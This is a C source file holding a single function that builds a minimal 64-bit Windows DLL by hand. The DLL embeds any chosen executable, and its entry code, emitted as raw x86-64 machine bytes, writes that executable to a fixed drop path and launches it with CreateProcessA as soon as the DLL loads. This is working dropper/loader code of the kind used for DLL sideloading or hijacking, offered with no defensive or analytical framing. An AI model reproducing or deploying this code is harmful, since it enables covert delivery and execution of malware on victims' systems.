#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    HANDLE output = INVALID_HANDLE_VALUE;
    BYTE *payload = NULL;
    BYTE *image = NULL;
    BYTE *rdata = NULL;
    LARGE_INTEGER file_size;
    size_t payload_size;
    size_t path_length;
    size_t payload_offset;
    size_t rdata_size;
    size_t rdata_raw_size;
    size_t image_size;
    size_t bytes_read_total;
    size_t bytes_written_total;
    size_t code_length;
    DWORD transferred;
    BOOL ok = FALSE;
    int result = -1;
    const char drop_path[] = DROP_PATH;
    BYTE code[512];
    size_t cp = 0;
    size_t disp_offset;
    size_t launch_label;
    size_t zero_offset;
    IMAGE_DOS_HEADER dos_header;
    IMAGE_NT_HEADERS64 nt_headers;
    IMAGE_SECTION_HEADER *sections;
    IMAGE_IMPORT_DESCRIPTOR import_descriptors[2];
    size_t i;
    const DWORD rdata_rva = 0x2000;
    const DWORD text_rva = 0x1000;
    const DWORD text_raw_offset = 0x200;
    const DWORD rdata_raw_offset = 0x400;
    const DWORD import_descriptor_offset = 0x00;
    const DWORD ilt_offset = 0x40;
    const DWORD iat_offset = 0x68;
    const DWORD dll_name_offset = 0x90;
    const DWORD create_file_name_offset = 0xA0;
    const DWORD write_file_name_offset = 0xB0;
    const DWORD close_handle_name_offset = 0xC0;
    const DWORD create_process_name_offset = 0xD0;
    uint64_t thunk_values[5];

#define EMIT8(v) do { code[cp++] = (BYTE)(v); } while (0)
#define EMIT32(v) do { uint32_t emit_value_ = (uint32_t)(v); memcpy(code + cp, &emit_value_, sizeof(emit_value_)); cp += sizeof(emit_value_); } while (0)
#define EMIT_RIP32(target_rva) EMIT32((int32_t)((int64_t)(target_rva) - (int64_t)(text_rva + cp + 4)))
#define PATCH_REL32(at, target) do { int32_t patch_value_ = (int32_t)((int64_t)(target) - (int64_t)((at) + 4)); memcpy(code + (at), &patch_value_, sizeof(patch_value_)); } while (0)

    if (binary_path == NULL || dll_out_path == NULL || drop_path[0] == '\0') {
        return -1;
    }

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX) {
        goto cleanup;
    }
    payload_size = (size_t)file_size.QuadPart;
    payload = (BYTE *)malloc(payload_size == 0 ? 1 : payload_size);
    if (payload == NULL) {
        goto cleanup;
    }

    bytes_read_total = 0;
    while (bytes_read_total < payload_size) {
        DWORD request = (DWORD)((payload_size - bytes_read_total) > UINT32_MAX
                                    ? UINT32_MAX
                                    : (payload_size - bytes_read_total));
        if (!ReadFile(input, payload + bytes_read_total, request, &transferred, NULL) ||
            transferred == 0) {
            goto cleanup;
        }
        bytes_read_total += transferred;
    }
    CloseHandle(input);
    input = INVALID_HANDLE_VALUE;

    path_length = sizeof(drop_path);
    if (path_length > SIZE_MAX - 0x100) {
        goto cleanup;
    }
    payload_offset = (0x100 + path_length + 15) & ~(size_t)15;
    if (payload_offset > SIZE_MAX - payload_size) {
        goto cleanup;
    }
    rdata_size = payload_offset + payload_size;
    if (rdata_size > SIZE_MAX - 0x1ff) {
        goto cleanup;
    }
    rdata_raw_size = (rdata_size + 0x1ff) & ~(size_t)0x1ff;
    if (rdata_raw_size > SIZE_MAX - rdata_raw_offset) {
        goto cleanup;
    }
    image_size = (size_t)rdata_raw_offset + rdata_raw_size;

    image = (BYTE *)calloc(1, image_size);
    if (image == NULL) {
        goto cleanup;
    }
    rdata = image + rdata_raw_offset;

    memcpy(rdata + dll_name_offset, "KERNEL32.dll", sizeof("KERNEL32.dll"));
    memcpy(rdata + create_file_name_offset + 2, "CreateFileA", sizeof("CreateFileA"));
    memcpy(rdata + write_file_name_offset + 2, "WriteFile", sizeof("WriteFile"));
    memcpy(rdata + close_handle_name_offset + 2, "CloseHandle", sizeof("CloseHandle"));
    memcpy(rdata + create_process_name_offset + 2, "CreateProcessA", sizeof("CreateProcessA"));
    memcpy(rdata + 0x100, drop_path, path_length);
    if (payload_size != 0) {
        memcpy(rdata + payload_offset, payload, payload_size);
    }

    memset(import_descriptors, 0, sizeof(import_descriptors));
    import_descriptors[0].OriginalFirstThunk = rdata_rva + ilt_offset;
    import_descriptors[0].Name = rdata_rva + dll_name_offset;
    import_descriptors[0].FirstThunk = rdata_rva + iat_offset;
    memcpy(rdata + import_descriptor_offset, import_descriptors,
           sizeof(import_descriptors));

    {
        uint16_t hint = 0;
        memcpy(rdata + create_file_name_offset, &hint, sizeof(hint));
        memcpy(rdata + write_file_name_offset, &hint, sizeof(hint));
        memcpy(rdata + close_handle_name_offset, &hint, sizeof(hint));
        memcpy(rdata + create_process_name_offset, &hint, sizeof(hint));
    }

    thunk_values[0] = rdata_rva + create_file_name_offset;
    thunk_values[1] = rdata_rva + write_file_name_offset;
    thunk_values[2] = rdata_rva + close_handle_name_offset;
    thunk_values[3] = rdata_rva + create_process_name_offset;
    thunk_values[4] = 0;
    memcpy(rdata + ilt_offset, thunk_values, sizeof(thunk_values));
    memcpy(rdata + iat_offset, thunk_values, sizeof(thunk_values));

     
    EMIT8(0x53);                                       
    EMIT8(0x48); EMIT8(0x81); EMIT8(0xEC); EMIT32(0x100);  
    EMIT8(0x83); EMIT8(0xFA); EMIT8(0x01);            
    EMIT8(0x0F); EMIT8(0x85);
    disp_offset = cp;
    EMIT32(0);                                         
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x0D);            
    EMIT_RIP32(rdata_rva + 0x100);
    EMIT8(0xBA); EMIT32(0x40000000);                  
    EMIT8(0x45); EMIT8(0x31); EMIT8(0xC0);            
    EMIT8(0x4D); EMIT8(0x31); EMIT8(0xC9);            
    EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x20); EMIT32(2);
    EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x28); EMIT32(FILE_ATTRIBUTE_NORMAL);
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x30); EMIT32(0);
    EMIT8(0xFF); EMIT8(0x15);                           
    EMIT_RIP32(rdata_rva + iat_offset);
    EMIT8(0x48); EMIT8(0x89); EMIT8(0xC3);             
    EMIT8(0x48); EMIT8(0x85); EMIT8(0xC0);             
    EMIT8(0x0F); EMIT8(0x84);
    {
        size_t invalid_handle_branch = cp;
        EMIT32(0);
        EMIT8(0x48); EMIT8(0x83); EMIT8(0xF8); EMIT8(0xFF);  
        EMIT8(0x0F); EMIT8(0x84);
        {
            size_t invalid_file_branch = cp;
            EMIT32(0);
            EMIT8(0x48); EMIT8(0x89); EMIT8(0xD9);     
            EMIT8(0x48); EMIT8(0x8D); EMIT8(0x15);     
            EMIT_RIP32(rdata_rva + (DWORD)payload_offset);
            EMIT8(0xBA); EMIT32((uint32_t)payload_size);  
            EMIT8(0x4C); EMIT8(0x8D); EMIT8(0x4C); EMIT8(0x24); EMIT8(0x50);
            EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x20); EMIT32(0);
            EMIT8(0xFF); EMIT8(0x15);                   
            EMIT_RIP32(rdata_rva + iat_offset + 8);
            EMIT8(0x48); EMIT8(0x89); EMIT8(0xD9);
            EMIT8(0xFF); EMIT8(0x15);                   
            EMIT_RIP32(rdata_rva + iat_offset + 16);
            launch_label = cp;
            PATCH_REL32(invalid_handle_branch, launch_label);
            PATCH_REL32(invalid_file_branch, launch_label);
        }
    }

    EMIT8(0x31); EMIT8(0xC0);                           
    for (zero_offset = 0x60; zero_offset <= 0xC0; zero_offset += 8) {
        EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24);
        EMIT8((BYTE)zero_offset);                      
    }
    EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x60);
    EMIT32(sizeof(STARTUPINFOA));
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x0D);             
    EMIT_RIP32(rdata_rva + 0x100);
    EMIT8(0x31); EMIT8(0xD2);                           
    EMIT8(0x45); EMIT8(0x31); EMIT8(0xC0);             
    EMIT8(0x45); EMIT8(0x31); EMIT8(0xC9);             
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x20); EMIT32(0);
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x28); EMIT32(0);
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x30); EMIT32(0);
    EMIT8(0x48); EMIT8(0xC7); EMIT8(0x44); EMIT8(0x24); EMIT8(0x38); EMIT32(0);
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x44); EMIT8(0x24); EMIT8(0x60);
    EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24); EMIT8(0x40);
    EMIT8(0x48); EMIT8(0x8D); EMIT8(0x84); EMIT8(0x24); EMIT32(0xD0);
    EMIT8(0x48); EMIT8(0x89); EMIT8(0x44); EMIT8(0x24); EMIT8(0x48);
    EMIT8(0xFF); EMIT8(0x15);                           
    EMIT_RIP32(rdata_rva + iat_offset + 24);

    launch_label = cp;
    EMIT8(0xB8); EMIT32(1);                             
    EMIT8(0x48); EMIT8(0x81); EMIT8(0xC4); EMIT32(0x100);
    EMIT8(0x5B);                                        
    EMIT8(0xC3);                                        
    PATCH_REL32(disp_offset, launch_label);

    code_length = cp;
    if (code_length > 0x200 || rdata_size > UINT32_MAX ||
        rdata_raw_size > UINT32_MAX || image_size > UINT32_MAX ||
        payload_offset > UINT32_MAX - rdata_rva) {
        goto cleanup;
    }

    memcpy(image + text_raw_offset, code, code_length);

    memset(&dos_header, 0, sizeof(dos_header));
    dos_header.e_magic = IMAGE_DOS_SIGNATURE;
    dos_header.e_lfanew = 0x80;
    memcpy(image, &dos_header, sizeof(dos_header));

    memset(&nt_headers, 0, sizeof(nt_headers));
    nt_headers.Signature = IMAGE_NT_SIGNATURE;
    nt_headers.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
    nt_headers.FileHeader.NumberOfSections = 2;
    nt_headers.FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    nt_headers.FileHeader.Characteristics =
        IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LARGE_ADDRESS_AWARE |
        IMAGE_FILE_DLL;

    nt_headers.OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    nt_headers.OptionalHeader.MajorLinkerVersion = 1;
    nt_headers.OptionalHeader.AddressOfEntryPoint = text_rva;
    nt_headers.OptionalHeader.BaseOfCode = text_rva;
    nt_headers.OptionalHeader.ImageBase = 0x180000000ULL;
    nt_headers.OptionalHeader.SectionAlignment = 0x1000;
    nt_headers.OptionalHeader.FileAlignment = 0x200;
    nt_headers.OptionalHeader.MajorOperatingSystemVersion = 6;
    nt_headers.OptionalHeader.MajorSubsystemVersion = 6;
    nt_headers.OptionalHeader.SizeOfImage =
        (DWORD)(((rdata_rva + (DWORD)rdata_size + 0xFFF) & ~0xFFFu));
    nt_headers.OptionalHeader.SizeOfHeaders = 0x200;
    nt_headers.OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_CUI;
    nt_headers.OptionalHeader.DllCharacteristics = IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
    nt_headers.OptionalHeader.SizeOfStackReserve = 0x100000;
    nt_headers.OptionalHeader.SizeOfStackCommit = 0x1000;
    nt_headers.OptionalHeader.SizeOfHeapReserve = 0x100000;
    nt_headers.OptionalHeader.SizeOfHeapCommit = 0x1000;
    nt_headers.OptionalHeader.NumberOfRvaAndSizes = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;
    nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress =
        rdata_rva + import_descriptor_offset;
    nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size =
        sizeof(import_descriptors);
    nt_headers.OptionalHeader.SizeOfCode = 0x200;
    nt_headers.OptionalHeader.SizeOfInitializedData = (DWORD)rdata_raw_size;

    memcpy(image + 0x80, &nt_headers, sizeof(nt_headers));
    sections = (IMAGE_SECTION_HEADER *)(image + 0x80 + sizeof(DWORD) +
                                        sizeof(IMAGE_FILE_HEADER) +
                                        sizeof(IMAGE_OPTIONAL_HEADER64));
    memset(sections, 0, 2 * sizeof(*sections));
    memcpy(sections[0].Name, ".text", 5);
    sections[0].Misc.VirtualSize = (DWORD)code_length;
    sections[0].VirtualAddress = text_rva;
    sections[0].SizeOfRawData = 0x200;
    sections[0].PointerToRawData = text_raw_offset;
    sections[0].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE |
                                  IMAGE_SCN_MEM_READ;
    memcpy(sections[1].Name, ".rdata", 6);
    sections[1].Misc.VirtualSize = (DWORD)rdata_size;
    sections[1].VirtualAddress = rdata_rva;
    sections[1].SizeOfRawData = (DWORD)rdata_raw_size;
    sections[1].PointerToRawData = rdata_raw_offset;
    sections[1].Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA |
                                  IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    output = CreateFileA(dll_out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (output == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    bytes_written_total = 0;
    while (bytes_written_total < image_size) {
        DWORD request = (DWORD)((image_size - bytes_written_total) > UINT32_MAX
                                    ? UINT32_MAX
                                    : (image_size - bytes_written_total));
        if (!WriteFile(output, image + bytes_written_total, request, &transferred, NULL) ||
            transferred == 0) {
            goto cleanup;
        }
        bytes_written_total += transferred;
    }
    if (!FlushFileBuffers(output)) {
        goto cleanup;
    }
    ok = TRUE;
    result = 0;

cleanup:
    if (input != INVALID_HANDLE_VALUE) {
        CloseHandle(input);
    }
    if (output != INVALID_HANDLE_VALUE) {
        CloseHandle(output);
        if (!ok) {
            DeleteFileA(dll_out_path);
        }
    }
    free(payload);
    free(image);
    return result;

#undef EMIT8
#undef EMIT32
#undef EMIT_RIP32
#undef PATCH_REL32
}